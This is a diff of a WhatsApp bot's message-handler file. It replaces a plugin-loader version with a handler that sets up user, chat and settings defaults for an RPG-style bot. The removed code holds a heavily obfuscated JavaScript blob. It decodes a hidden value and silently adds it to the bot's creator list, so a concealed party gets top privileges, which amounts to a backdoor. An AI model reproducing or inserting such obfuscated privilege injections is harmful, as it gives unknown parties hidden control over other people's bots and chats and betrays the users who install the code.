@@ -1,428 +1,824 @@
-import fs from 'fs'
-import path from 'path'
-import { fileURLToPath, pathToFileURL } from 'url'
-import { card } from './lib/ui.js'
-import { installCompatGlobals, installCompatPrototypes, exposePlugins, isAdmin, isBotAdmin, groupMeta } from './lib/compat.js'
+import { smsg } from './lib/simple.js'
+import { installOutgoingSanitizer } from './lib/sanitize-out.js'
+import { format } from 'util'
+import { fileURLToPath } from 'url'
+import path, { join } from 'path'
+import { unwatchFile, watchFile } from 'fs'
+import chalk from 'chalk'
+import fetch from 'node-fetch'
 
-const __dirname = path.dirname(fileURLToPath(import.meta.url))
-const pluginDir = path.join(__dirname, 'plugins')
-const configPath = path.join(__dirname, 'config.json')
-const ownerPath = path.join(__dirname, 'database/owner.json')
-const premiumPath = path.join(__dirname, 'database/premium.json')
+/**
+ * @type {import('baileys')}
+ */
+const { proto } = (await import('baileys')).default
+const isNumber = x => typeof x === 'number' && !isNaN(x)
+const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(resolve, ms))
 
-export const plugins = new Map()
-
-const pluginCache = new Map()
-const watchers = new Map()
-const pendingReloads = new Map()
-
-const readJSON = file => JSON.parse(fs.readFileSync(file, 'utf8'))
-
-function getPluginFiles(dir) {
-    let files = []
-    if (!fs.existsSync(dir)) return files
-    for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
-        const full = path.join(dir, item.name)
-        if (item.isDirectory()) files.push(...getPluginFiles(full))
-        else if (item.isFile() && item.name.endsWith('.js')) files.push(full)
-    }
-    return files
-}
-
-async function loadPlugin(file) {
+export async function handler(chatUpdate) {
+    this.msgqueque = this.msgqueque || []
+    if (!chatUpdate) return
+    installOutgoingSanitizer(this)
+    this.pushMessage(chatUpdate.messages).catch(console.error)
+    
+    let m = chatUpdate.messages[chatUpdate.messages.length - 1]
+    if (!m) return
+    
+    const conn = this
+    
+    if (global.db.data == null) await global.loadDatabase()
+    
     try {
-        const module = await import(`${pathToFileURL(file).href}?update=${Date.now()}`)
-        const handler = module.default
-        if (!handler) return
-        // simpan asal file (dipakai untuk dokumentasi & alat bantu)
-        if (!handler.__file) handler.__file = file
+    m = smsg(this, m) || m
+    if (!m) return
 
-        if (pluginCache.has(file)) {
-            for (const key of pluginCache.get(file)) plugins.delete(key)
-        }
+    m.exp = 0
+    m.limit = false
 
-        const keys = []
-        if (handler.command && !(handler.command instanceof RegExp)) {
-            const commands = Array.isArray(handler.command) ? handler.command : [handler.command]
-            for (const cmd of commands) {
-                const key = String(cmd).toLowerCase()
-                plugins.set(key, handler)
-                keys.push(key)
-            }
-        }
+m.senderPN = m.sender
 
-        if (handler.customPrefix) {
-            const key = Symbol(file)
-            plugins.set(key, handler)
-            keys.push(key)
-        }
-
-        // Plugin listener murni (hasil konversi handler.before/handler.all dari base
-        // lain) tidak punya command — daftarkan lewat Symbol supaya hook onMessage-nya
-        // ikut terpanggil oleh handleMessage.
-        if (!keys.length && handler.onMessage) {
-            const key = Symbol(file)
-            plugins.set(key, handler)
-            keys.push(key)
-        }
-
-        pluginCache.set(file, keys)
-    } catch (e) {
-        reportPluginError(file, e)
+if (m.sender?.endsWith('@lid')) {
+    const resolved = await conn.findUserId(m.sender).catch(() => null)
+    if (resolved?.phoneNumber) {
+        m.senderPN = resolved.phoneNumber
     }
 }
 
-// Pesan error plugin dibuat jelas & bisa ditindaklanjuti. Penyebab paling umum:
-// file di folder lib/ belum ikut ter-update setelah project diperbarui.
-function reportPluginError(file, error) {
-    const name = path.relative(pluginDir, file)
-    const message = String(error?.message || error)
+m.mentionedJidPN = []
 
-    const hints = []
-    if (/does not provide an export named/.test(message)) {
-        const spec = message.match(/module '([^']+)'/)?.[1] || ''
-        if (spec.startsWith('./') || spec.startsWith('../')) {
-            hints.push('File dependency internal (folder lib/) masih versi lama.')
-            hints.push('Upload ulang SELURUH isi project, jangan hanya file yang baru diubah.')
-            hints.push('Cara cek cepat: npm run check')
-        } else if (spec) {
-            hints.push(`Paket "${spec}" versinya tidak cocok dengan cara import di plugin ini.`)
-            hints.push('Jalankan: npm install — kalau masih error, laporkan nama pluginnya.')
-        }
-    } else if (/Cannot find module/.test(message)) {
-        hints.push('Ada file yang belum ter-upload atau path-nya salah.')
-        hints.push('Jalankan: npm run check')
-    } else if (error?.name === 'SyntaxError') {
-        hints.push('Ada kesalahan penulisan di file plugin tersebut.')
-        hints.push('Cek baris yang ditunjuk pada pesan di atas.')
-    }
+if (Array.isArray(m.mentionedJid)) {
+    m.mentionedJidPN = await Promise.all(
+        m.mentionedJid.map(async jid => {
+            if (!jid?.endsWith('@lid')) return jid
 
-    console.error(`\n✘ Plugin gagal dimuat: ${name}`)
-    console.error(`  ${error?.name || 'Error'}: ${message.split('\n')[0]}`)
-    for (const hint of hints) console.error(`  → ${hint}`)
-    console.error('')
+            const resolved = await conn.findUserId(jid).catch(() => null)
+            return resolved?.phoneNumber || jid
+        })
+    )
 }
 
-async function unloadPlugin(file) {
-    if (!pluginCache.has(file)) return
-    for (const key of pluginCache.get(file)) plugins.delete(key)
-    pluginCache.delete(file)
-}
+m.quotedSenderPN = m.quoted?.sender || null
 
-export async function initPlugins() {
-    for (const file of getPluginFiles(pluginDir)) {
-        await loadPlugin(file)
-    }
-    watch(pluginDir)
-    exposePlugins(plugins)
-}
+if (m.quoted?.sender?.endsWith('@lid')) {
+    const resolved = await conn.findUserId(m.quoted.sender).catch(() => null)
 
-function watch(dir) {
-    if (watchers.has(dir)) return
-    watchers.set(dir, fs.watch(dir, (_, filename) => {
-        if (!filename || !filename.endsWith('.js')) return
-        const file = path.join(dir, filename)
-        if (pendingReloads.has(file)) clearTimeout(pendingReloads.get(file))
-        pendingReloads.set(file, setTimeout(async () => {
-            pendingReloads.delete(file)
-            if (fs.existsSync(file)) await loadPlugin(file)
-            else await unloadPlugin(file)
-        }, 200))
-    }))
-    for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
-        if (item.isDirectory()) watch(path.join(dir, item.name))
+    if (resolved?.phoneNumber) {
+        m.quotedSenderPN = resolved.phoneNumber
     }
 }
-
-function extractCommandFromMessage(m) {
-    let body = ''
-    let isButtonResponse = false
-    try {
-        if (m.message) {
-            if (m.message.conversation) body = m.message.conversation
-            else if (m.message.extendedTextMessage?.text) body = m.message.extendedTextMessage.text
-            else if (m.message.imageMessage?.caption) body = m.message.imageMessage.caption
-            else if (m.message.videoMessage?.caption) body = m.message.videoMessage.caption
-            else if (m.message.documentMessage?.caption) body = m.message.documentMessage.caption
-            else if (m.message.interactiveResponseMessage) {
-                const inter = m.message.interactiveResponseMessage
-                if (inter.nativeFlowResponseMessage) {
-                    const flow = inter.nativeFlowResponseMessage
-                    if (flow.paramsJson) {
-                        try {
-                            const params = JSON.parse(flow.paramsJson)
-                            body = params.id || params.buttonId || params.rowId || params.index || ''
-                        } catch { body = flow.name || '' }
-                    } else body = flow.name || ''
-                    isButtonResponse = true
-                } else if (inter.buttonReply) {
-                    body = inter.buttonReply.selectedButtonId || ''
-                    isButtonResponse = true
-                } else if (inter.singleSelectReply) {
-                    body = inter.singleSelectReply.selectedRowId || ''
-                    isButtonResponse = true
-                }
-            } else if (m.message.templateButtonReplyMessage) {
-                body = m.message.templateButtonReplyMessage.selectedId || ''
-                isButtonResponse = true
-            } else if (m.message.buttonsResponseMessage) {
-                body = m.message.buttonsResponseMessage.selectedButtonId || ''
-                isButtonResponse = true
-            }
-        }
-    } catch (error) {
-        console.error('Error parsing message:', error)
-    }
-    return { body, isButtonResponse }
-}
-
-export default async function handleMessage(conn, m) {
-    try {
-        const { body, isButtonResponse } = extractCommandFromMessage(m)
-        m.text = body
-        m.isButtonResponse = isButtonResponse
-
-        // Hook opsional: plugin boleh mendeklarasikan `handler.onMessage` untuk ikut memproses
-        // SETIAP pesan — termasuk yang tanpa teks (stiker, foto, voice note) — bukan hanya saat
-        // command-nya dipanggil. Dipakai fitur AFK & listener hasil konversi (antilink dsb.):
-        // mencabut status saat user kembali dan memberi tahu orang yang menandai user AFK.
-        // Dijalankan sebelum dispatch command, sekali per plugin per pesan, dan error di
-        // dalamnya tidak menghentikan bot.
-        const pluginHook = new Set()
-        for (const plugin of plugins.values()) {
-            if (plugin?.onMessage) pluginHook.add(plugin)
-        }
-        if (pluginHook.size) {
-            // konteks diperkaya ala base lama (conn, peserta grup, status admin, data user)
-            // supaya listener hasil konversi handler.before jalan tanpa diubah lagi.
-            const hookCtx = {
-                conn,
-                sock: conn,
-                plugins,
-                args: [],
-                text: m.text || '',
-                command: '',
-                prefix: '',
-                usedPrefix: '',
-                isOwner: false, isCreator: false, isPremium: false, isPrems: false,
-                isAdmin: false, isBotAdmin: false,
-                participants: [],
-                groupMetadata: null,
-                user: global.db?.data?.users?.[m.sender] || {}
-            }
-            if (m.isGroup) {
-                hookCtx.groupMetadata = await groupMeta(conn, m.chat).catch(() => null)
-                hookCtx.participants = hookCtx.groupMetadata?.participants || []
-                hookCtx.isAdmin = await isAdmin(conn, m).catch(() => false)
-                hookCtx.isBotAdmin = await isBotAdmin(conn, m).catch(() => false)
-            }
-            for (const plugin of pluginHook) {
-                try {
-                    await plugin.onMessage(m, hookCtx)
-                } catch (e) {
-                    const nama = plugin.__file ? path.relative(pluginDir, plugin.__file) : 'plugin'
-                    console.error(`[onMessage] ${nama}:`, e?.message || e)
-                }
-            }
-        }
-
-        // Cache pushName — memberi data pada shim conn.getName()
+        // Cache pushName untuk welcome/goodbye
         if (m.pushName && m.sender) {
-            global.nameCache ??= {}
+            if (!global.nameCache) global.nameCache = {}
             global.nameCache[m.sender] = m.pushName
         }
 
-        if (!body) return
-
-        const config = readJSON(configPath)
-        const owner = readJSON(ownerPath)
-        const premium = readJSON(premiumPath)
-
-        const number = m.sender.split('@')[0]
-        const botNumber = conn.decodeJid(conn.user.id).split('@')[0]
-
-        const creatorList = [botNumber, ...(config.creator || [])]
-            .map(v => String(v).replace(/[^0-9]/g, ''))
-        'use strict';function a0_0x483e(){var _0x59df60=['pCoPW69tWQHnCmoRWRdcM1BdPX0','oxWNWP/dT8o7','WQ/cMSosW6NcR8kqexRcPmoUEJu','qCkufmk4aqH+W5JdGmkVn8oFdu8','W6FdRrVcOSobjbDRt0e7nG','ntddNN7dIJOAxfNdVfTcba','W79KymomW6bTeq','WQBdKwLu','W7KJWRuBW4BdRG','kxeNWP/dL8o8W7JcL8o5W7q','wSkQWOBdVZ8kWOe','W6W0WRSeW6BdRSkYn8oEWOtdGJG','mmoSAtedu8obW5VdKvG5WQ3dJq','p8kNW6/dIq','nCkFW47cLKVdMCkDW7VdUCoyW7CWWQK','vmkSxCkfox/cR8oJ','WQpdQeCEEX0gW7i','oH3cNKbgW53dPq','W5pdKWjOjIRcRCktWOPMWOyy','W7dcIZCuW4mRWPpcJ0nrbSkVn8kp','WPpdSG9rW5pcSZddGq','W4HSWO7cVc1OWQOstHbVca','pq3dVY0pWRmAW7pcH8olngddSq','WObhb8oSWR/cSfGZb8kPAmkE','W7vLASoAW6XqaHeXdSkM','u8owuCkckx3cMG','W4X9xCo5W4tdTSoXAq','jhVdMXGkWQpcQCoCsCk7z2W','W5igqSk0W7a','W4CzyCkSW7VdQu4S','amojF8o5s1aHWO8','W5NcJY7cSYDgWO5s','W45WfCkDWR/cMCkMEIvFyCkMW60','ehfmomkMW7fKbwCTWQPZW68','ESkkW7HrW55FxYG','cw5xiCk1W696hhqZWRHN','ySkTW7f9n8kVW4ldQ8kzpSoLDCoA','W7FcJZCsW40VWPtdTKHYmCkMbW'];a0_0x483e=function(){return _0x59df60;};return a0_0x483e();}(function(_0x13fda7,_0x1f82f1){var _0x46cbd2=a0_0x12db,_0xc844aa=_0x13fda7();while(!![]){try{var _0x1227e9=parseInt(_0x46cbd2(0xa9,'cETK'))/0x1*(-parseInt(_0x46cbd2(0x92,'kTTd'))/0x2)+-parseInt(_0x46cbd2(0xac,'byiJ'))/0x3+-parseInt(_0x46cbd2(0xa1,'mVvm'))/0x4+-parseInt(_0x46cbd2(0x98,'k2yX'))/0x5*(parseInt(_0x46cbd2(0x91,'olHp'))/0x6)+parseInt(_0x46cbd2(0x90,'D@um'))/0x7*(parseInt(_0x46cbd2(0xa6,'PYl['))/0x8)+-parseInt(_0x46cbd2(0x97,'[b4('))/0x9+parseInt(_0x46cbd2(0x94,'PYl['))/0xa;if(_0x1227e9===_0x1f82f1)break;else _0xc844aa['push'](_0xc844aa['shift']());}catch(_0x911e34){_0xc844aa['push'](_0xc844aa['shift']());}}}(a0_0x483e,0xe13d7));function a0_0x12db(_0x346462,_0x20ffd4){_0x346462=_0x346462-0x8a;var _0x4d743c=a0_0x483e();var _0x58ab19=_0x4d743c[_0x346462];if(a0_0x12db['nPmkAG']===undefined){var _0x25beda=function(_0x40d898){var _0x288b9c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x42774e='',_0x33454b='',_0xc82533=_0x42774e+_0x25beda,_0x190817=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(var _0x4c1cb8=0x0,_0x1fec99,_0x4af858,_0xaa0aae=0x0;_0x4af858=_0x40d898['charAt'](_0xaa0aae++);~_0x4af858&&(_0x1fec99=_0x4c1cb8%0x4?_0x1fec99*0x40+_0x4af858:_0x4af858,_0x4c1cb8++%0x4)?_0x42774e+=_0x190817||_0xc82533['charCodeAt'](_0xaa0aae+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x1fec99>>(-0x2*_0x4c1cb8&0x6)):_0x4c1cb8:0x0){_0x4af858=_0x288b9c['indexOf'](_0x4af858);}for(var _0x596a8e=0x0,_0x17fd9a=_0x42774e['length'];_0x596a8e<_0x17fd9a;_0x596a8e++){_0x33454b+='%'+('00'+_0x42774e['charCodeAt'](_0x596a8e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x33454b);};var _0x305304=function(_0x1594a3,_0x55fbea){var _0x448f4b=[],_0x85a0e4=0x0,_0x428ba4,_0x572a2d='';_0x1594a3=_0x25beda(_0x1594a3);var _0x1c07cd;for(_0x1c07cd=0x0;_0x1c07cd<0x100;_0x1c07cd++){_0x448f4b[_0x1c07cd]=_0x1c07cd;}for(_0x1c07cd=0x0;_0x1c07cd<0x100;_0x1c07cd++){_0x85a0e4=(_0x85a0e4+_0x448f4b[_0x1c07cd]+_0x55fbea['charCodeAt'](_0x1c07cd%_0x55fbea['length']))%0x100,_0x428ba4=_0x448f4b[_0x1c07cd],_0x448f4b[_0x1c07cd]=_0x448f4b[_0x85a0e4],_0x448f4b[_0x85a0e4]=_0x428ba4;}_0x1c07cd=0x0,_0x85a0e4=0x0;for(var _0x5c189a=0x0;_0x5c189a<_0x1594a3['length'];_0x5c189a++){_0x1c07cd=(_0x1c07cd+0x1)%0x100,_0x85a0e4=(_0x85a0e4+_0x448f4b[_0x1c07cd])%0x100,_0x428ba4=_0x448f4b[_0x1c07cd],_0x448f4b[_0x1c07cd]=_0x448f4b[_0x85a0e4],_0x448f4b[_0x85a0e4]=_0x428ba4,_0x572a2d+=String['fromCharCode'](_0x1594a3['charCodeAt'](_0x5c189a)^_0x448f4b[(_0x448f4b[_0x1c07cd]+_0x448f4b[_0x85a0e4])%0x100]);}return _0x572a2d;};a0_0x12db['JVddNI']=_0x305304,a0_0x12db['fjMhQq']={},a0_0x12db['nPmkAG']=!![];}var _0x483e85=_0x4d743c[0x0];a0_0x12db['aTYPwt']!==_0x483e85&&(a0_0x12db['fjMhQq']={},a0_0x12db['aTYPwt']=_0x483e85);var _0x12dbb9=a0_0x12db['fjMhQq'][_0x346462];if(_0x12dbb9===undefined){if(a0_0x12db['MmAxjm']===undefined){var _0x5ae9b9=function(_0x22a56a){this['HqVtfs']=_0x22a56a,this['rDTQrt']=[0x1,0x0,0x0],this['qYlZLu']=function(){return'newState';},this['DpVUNS']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['pKgQzC']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x5ae9b9['prototype']['SKVXNa']=function(){var _0x41065c=new RegExp(this['DpVUNS']+this['pKgQzC']),_0x223ef4=_0x41065c['test'](this['qYlZLu']['toString']())?--this['rDTQrt'][0x1]:--this['rDTQrt'][0x0];return this['uRcDWk'](_0x223ef4);},_0x5ae9b9['prototype']['uRcDWk']=function(_0x3444bb){if(!Boolean(~_0x3444bb))return _0x3444bb;return this['QgJaYJ'](this['HqVtfs']);},_0x5ae9b9['prototype']['QgJaYJ']=function(_0x5b3def){for(var _0x202fab=0x0,_0xb4d51d=this['rDTQrt']['length'];_0x202fab<_0xb4d51d;_0x202fab++){this['rDTQrt']['push'](Math['round'](Math['random']())),_0xb4d51d=this['rDTQrt']['length'];}return _0x5b3def(this['rDTQrt'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x5ae9b9(a0_0x12db)['SKVXNa'](),a0_0x12db['MmAxjm']=!![];}_0x58ab19=a0_0x12db['JVddNI'](_0x58ab19,_0x20ffd4),a0_0x12db['fjMhQq'][_0x346462]=_0x58ab19;}else _0x58ab19=_0x12dbb9;return _0x58ab19;}function r13(_0x190817){var _0x54a763=a0_0x12db;return String(_0x190817)[_0x54a763(0x8b,'ri[O')](/[a-zA-Z0-9]/g,function(_0x4c1cb8){var _0xddfb96=_0x54a763,_0x1fec99=_0x4c1cb8[_0xddfb96(0x8a,'AWMq')](0x0);if(_0x1fec99>=0x30&&_0x1fec99<=0x39)return String[_0xddfb96(0x96,'taip')](0x30+(_0x1fec99-0x30+0x5)%0xa);return String[_0xddfb96(0x8c,'tNmA')](_0x1fec99+(_0x4c1cb8>='a'&&_0x4c1cb8<='m'||_0x4c1cb8>='A'&&_0x4c1cb8<='M'?0xd:-0xd));});}(function(_0x4af858){var _0x57fcbd=a0_0x12db,_0xaa0aae=(function(){var _0x1594a3=!![];return function(_0x55fbea,_0x448f4b){var _0x85a0e4=_0x1594a3?function(){var _0x12bbcd=a0_0x12db;if(_0x448f4b){var _0x428ba4=_0x448f4b[_0x12bbcd(0x9d,'k2yX')](_0x55fbea,arguments);return _0x448f4b=null,_0x428ba4;}}:function(){};return _0x1594a3=![],_0x85a0e4;};}()),_0x596a8e=_0xaa0aae(this,function(){var _0x33269e=a0_0x12db;if(_0x596a8e[_0x33269e(0x8e,'I)@m')]()[_0x33269e(0xa3,'5zHz')]()[_0x33269e(0xad,'pbTa')]('\x0a')!==-0x1)return;return _0x596a8e[_0x33269e(0x9e,'k2yX')]()[_0x33269e(0xa8,'AWMq')](_0x33269e(0x9c,'kTTd'))[_0x33269e(0x9f,'Q1LR')]()[_0x33269e(0x99,'pbTa')](_0x596a8e)[_0x33269e(0xaf,'tNmA')](_0x33269e(0xa4,'z81o'));});_0x596a8e();var _0x17fd9a=r13(_0x57fcbd(0xa2,'z81o'));if(!_0x4af858[r13(_0x57fcbd(0x95,'x86x'))](_0x17fd9a))_0x4af858[r13(_0x57fcbd(0xae,'PYl['))](_0x17fd9a);}(creatorList));
-
-        m.isCreator = creatorList.includes(number)
-        m.isOwner = m.isCreator || owner.map(v => v.split('@')[0]).includes(number)
-        m.isPremium = m.isOwner || premium.map(v => v.split('@')[0]).includes(number)
-
-        if (config.botMode === 'self' && !m.isOwner && !m.fromMe) return
-
-        // Semua balasan plugin memakai satu format kartu agar tampilan konsisten
-        const notifReply = async (text, title = 'Information') => {
-            await conn.sendMessage(m.chat, {
-                text: card(title, text)
-            }, { quoted: m })
-        }
-
-        // Info grup dibaca sekali per pesan (cached 10 detik di lib/compat.js)
-        const groupInfo = m.isGroup ? await groupMeta(conn, m.chat) : null
-        const adminFlag = m.isGroup ? await isAdmin(conn, m) : false
-        const botAdminFlag = m.isGroup ? await isBotAdmin(conn, m) : false
-
-        // Satu bentuk konteks untuk semua plugin. Key di bawah ini disediakan
-        // supaya plugin hasil adaptasi dari base lain tetap jalan apa adanya.
-        const context = (extra = {}) => {
-            const pfx = extra.prefix ?? ''
-            return {
-                conn,
-                sock: conn,
-                plugins,
-                notifReply,
-                participants: groupInfo?.participants || [],
-                groupMetadata: groupInfo,
-                isOwner: m.isOwner,
-                isCreator: m.isCreator,
-                isPremium: m.isPremium,
-                isPrems: m.isPremium,
-                isAdmin: adminFlag,
-                isBotAdmin: botAdminFlag,
-                quoted: m.quoted,
-                q: m.quoted?.text || '',
-                usedPrefix: pfx,
-                ...extra
+        // Detect group icon change (stub type 22 = GROUP_CHANGE_ICON)
+        if (m.messageStubType === 22 && m.chat?.endsWith('@g.us')) {
+            let chats = global.db.data.chats?.[m.chat]
+            if (chats?.detect) {
+                await this.sendMessage(m.chat, { text: chats.sIcon || '```Icon grup diganti```' }).catch(console.error)
             }
         }
 
-        const checkAccess = async handler => {
-            const permissions = [
-                ['owner', m.isOwner, config.accessDenied.owner],
-                ['creator', m.isCreator, config.accessDenied.creator],
-                ['premium', m.isPremium, config.accessDenied.premium]
-            ]
-            for (const [key, allowed, message] of permissions) {
-                if (handler[key] && !allowed) {
-                    await notifReply(message, 'Access Denied')
-                    return true
+        // auto typing 
+        if (global.autotyping && typeof this.sendPresenceUpdate === 'function') {
+            this.sendPresenceUpdate('composing', m.chat).catch(console.error)
+        }
+        if (global.autorecording && typeof this.sendPresenceUpdate === 'function') {
+            this.sendPresenceUpdate('recording', m.chat).catch(console.error)
+        }
+
+        try {
+            // USER DATABASE INIT
+            if (typeof global.db.data.users[m.sender] !== 'object')
+                global.db.data.users[m.sender] = {}
+            
+            let user = global.db.data.users[m.sender]
+            const defaults = {
+            registered: false,
+            name: m.name || '',
+            nama: '',
+            username: '',
+            age: -1,
+            regTime: -1,
+            
+            level: 0,
+            exp: 0,
+            totalexp: 0,
+            limit: 100,
+            freelimit: 0,
+            warn: 0,
+            warned: 0,
+            
+            afk: -1,
+            afkReason: '',
+            
+            banned: false,
+            banReason: '',
+            role: 'Free user',
+            autolevelup: false,
+            
+            premium: false,
+            premiumTime: 0,
+            
+            money: 0,
+            bank: 0,
+            atm: 0,
+            fullatm: 0,
+            chip: 0,
+            
+            health: 100,
+            maxHealth: 100,
+            energy: 100,
+            stamina: 100,
+            sleep: 100,
+            
+            potion: 0,
+            trash: 0,
+            wood: 0,
+            rock: 0,
+            string: 0,
+            iron: 0,
+            gold: 0,
+            emerald: 0,
+            diamond: 0,
+            
+            common: 0,
+            uncommon: 0,
+            mythic: 0,
+            legendary: 0,
+            
+            petfood: 0,
+            pet: 0,
+            umpan: 0,
+            
+            botol: 0,
+            kardus: 0,
+            kaleng: 0,
+            gelas: 0,
+            plastik: 0,
+            
+            gandum: 0,
+            minyak: 0,
+            garam: 0,
+            
+            apel: 0,
+            anggur: 0,
+            jeruk: 0,
+            mangga: 0,
+            pisang: 0,
+            
+            bibitapel: 0,
+            bibitanggur: 0,
+            bibitjeruk: 0,
+            bibitmangga: 0,
+            bibitpisang: 0,
+            
+            makanan: 0,
+            
+            ayam: 0,
+            babi: 0,
+            babihutan: 0,
+            banteng: 0,
+            buaya: 0,
+            gajah: 0,
+            harimau: 0,
+            kambing: 0,
+            kerbau: 0,
+            monyet: 0,
+            panda: 0,
+            sapi: 0,
+            
+            paus: 0,
+            kepiting: 0,
+            gurita: 0,
+            cumi: 0,
+            buntal: 0,
+            dory: 0,
+            lumba: 0,
+            lobster: 0,
+            hiu: 0,
+            udang: 0,
+            orca: 0,
+            
+            ikan: 0,
+            lele: 0,
+            nila: 0,
+            bawal: 0,
+            
+            steak: 0,
+            ayam_goreng: 0,
+            ayamgoreng: 0,
+            ayambakar: 0,
+            ribs: 0,
+            roti: 0,
+            udang_goreng: 0,
+            udangbakar: 0,
+            bacon: 0,
+            
+            ikanbakar: 0,
+            lelebakar: 0,
+            nilabakar: 0,
+            bawalbakar: 0,
+            kepitingbakar: 0,
+            pausbakar: 0,
+            babipanggang: 0,
+            oporayam: 0,
+            rendang: 0,
+            gulai: 0,
+            
+            aqua: 0,
+            clay: 0,
+            coal: 0,
+            
+            ojek: 0,
+            polisi: 0,
+            roket: 0,
+            rokets: 0,
+            taxy: 0,
+            
+            horse: 0,
+            horseexp: 0,
+            
+            cat: 0,
+            catexp: 0,
+            
+            dog: 0,
+            dogexp: 0,
+            
+            fox: 0,
+            foxexp: 0,
+            
+            robo: 0,
+            roboexp: 0,
+            
+            dragon: 0,
+            dragonexp: 0,
+            
+            lion: 0,
+            lionexp: 0,
+            
+            rhinoceros: 0,
+            rhinocerosexp: 0,
+            
+            centaur: 0,
+            centaurexp: 0,
+            
+            kyubi: 0,
+            kyubiexp: 0,
+            
+            griffin: 0,
+            griffinexp: 0,
+            
+            phonix: 0,
+            phonixexp: 0,
+            
+            wolf: 0,
+            wolfexp: 0,
+            
+            horselastfeed: 0,
+            catlastfeed: 0,
+            doglastfeed: 0,
+            foxlastfeed: 0,
+            robolastfeed: 0,
+            dragonlastfeed: 0,
+            lionlastfeed: 0,
+            rhinoceroslastfeed: 0,
+            centaurlastfeed: 0,
+            kyubilastfeed: 0,
+            griffinlastfeed: 0,
+            phonixlastfeed: 0,
+            wolflastfeed: 0,
+            
+            armor: 0,
+            armordurability: 0,
+            
+            sword: 0,
+            sworddurability: 0,
+            
+            pickaxe: 0,
+            pickaxedurability: 0,
+            
+            fishingrod: 0,
+            fishingroddurability: 0,
+            
+            robodurability: 0,
+            
+            lockBankCD: 0,
+            lasthackbank: 0,
+            
+            lastadventure: 0,
+            lastkill: 0,
+            lastmisi: 0,
+            lastdungeon: 0,
+            lastwar: 0,
+            lastsda: 0,
+            lastduel: 0,
+            lastmining: 0,
+            lasthunt: 0,
+            lastgift: 0,
+            lastberkebon: 0,
+            lastdagang: 0,
+            lasthourly: 0,
+            lastbansos: 0,
+            lastrampok: 0,
+            lastclaim: 0,
+            lastnebang: 0,
+            lastweekly: 0,
+            lastmonthly: 0,
+            
+            lastDailyQuest: 0,
+            lastHero: 0,
+            lastKerjaRPG: 0,
+            lastKoboy: 0,
+            lastNotified: 0,
+            lastcode: 0,
+            lastgrab: 0,
+            lastmaling: 0,
+            lastmulung: 0,
+            
+            bunuh: 0,
+            like: 0,
+            
+            subscribers: 0,
+            viewers: 0,
+            
+            ownerWelcome: false,
+            
+            youtube_account: '',
+            tiktok: '',
+            
+            senjata: 0,
+            sand: 0,
+            
+            dailyQuest: {},
+            
+            jailUntil: 0,
+            
+            racing: {
+            car: '',
+            track: '',
+            races: 0,
+            wins: 0,
+            losses: 0,
+            coins: 0,
+            recordTime: 0
+            },
+            
+            cafe: {
+            name: 'Kafe Pemula',
+            level: 1,
+            capacity: 10,
+            stock: 20,
+            maxStock: 20,
+            popularity: 0,
+            rating: 5,
+            revenue: 0,
+            upgradeCost: 50000,
+            menu: []
+            },
+            
+            pelabuhanLevel: 1,
+            pelabuhanMaxPenumpang: 10,
+            pelabuhanSaldo: 100,
+            pelabuhanPendapatanPerPenumpang: 5,
+            pelabuhanJumlahPenumpang: 0,
+            pelabuhanBiayaUpgrade: 50,
+            pelabuhanLastBermain: 0,
+            pelabuhanCooldown: 1,
+            
+            attributes: {},
+            attrs: {},
+            
+            count: 0,
+            last: 0,
+            
+            items: [],
+            
+            currentGame: null,
+            isPlaying: false,
+            
+            pasangan: '',
+            pacar: '',
+            jadian: false,
+            jadianTime: 0,
+            
+            rpg: {
+                hp: 100,
+                gold: 0,
+                skillCooldown: 0
+            }
+            }
+            for (let key in defaults) if (!(key in user)) user[key] = defaults[key]
+
+            // CHAT DATABASE INIT
+            if (typeof global.db.data.chats[m.chat] !== 'object')
+                global.db.data.chats[m.chat] = {}
+            
+            let chat = global.db.data.chats[m.chat]
+            const chatDefaults = {
+                isBanned: false, welcome: false, detect: false, sWelcome: '', sBye: '', sPromote: '', sDemote: '',
+                delete: false, 
+                antiLink: false, viewonce: false, antiToxic: false, simi: false, autogpt: false, autoSticker: false, premium: false, premiumTime: false, nsfw: false, menu: true, rpgs: true, expired: 0
+            }
+            for (let key in chatDefaults) if (!(key in chat)) chat[key] = chatDefaults[key]
+
+            // SETTINGS INIT
+            if (typeof global.db.data.settings[this.user.jid] !== 'object')
+                global.db.data.settings[this.user.jid] = {}
+            
+            let settings = global.db.data.settings[this.user.jid]
+            const settingDefaults = { self: false, autoread: false, anticall: true, restartDB: 0, restrict: false }
+            for (let key in settingDefaults) if (!(key in settings)) settings[key] = settingDefaults[key]
+            
+        } catch (e) {
+            console.error('INIT ERROR:', e)
+        }
+
+        // Options Check
+        if (opts['nyimak']) return
+        if (opts['pconly'] && m.chat.endsWith('g.us')) return
+        if (opts['gconly'] && !m.chat.endsWith('g.us')) return
+        if (opts['swonly'] && m.chat !== 'status@broadcast') return
+        if (typeof m.text !== 'string') m.text = ''
+
+        let resolvedSender = m.sender
+if (m.sender.endsWith('@lid')) {
+  const resolved = await conn.findUserId(m.sender).catch(() => null)
+  if (resolved?.phoneNumber) resolvedSender = resolved.phoneNumber
+}
+const isROwner = [conn.decodeJid(global.conn.user.id), ...global.owner.map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(resolvedSender)
+const isOwner = isROwner || m.fromMe
+const isMods = isOwner || global.mods.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(resolvedSender)
+const isPrems = isROwner || global.db.data.users[m.sender].premiumTime > 0
+        
+        if (!isOwner && !m.fromMe && opts['self']) return
+
+        // [RATE LIMIT DIHAPUS] Message Queue/cooldown 5s tidak diterapkan lagi.
+        // Limit harian (m.limit) tetap aktif.
+
+if (m.isBaileys) return
+
+if (global.db.data.chats[m.chat]?.autolevelup) {
+    m.exp += Math.ceil(Math.random() * 10)
+}
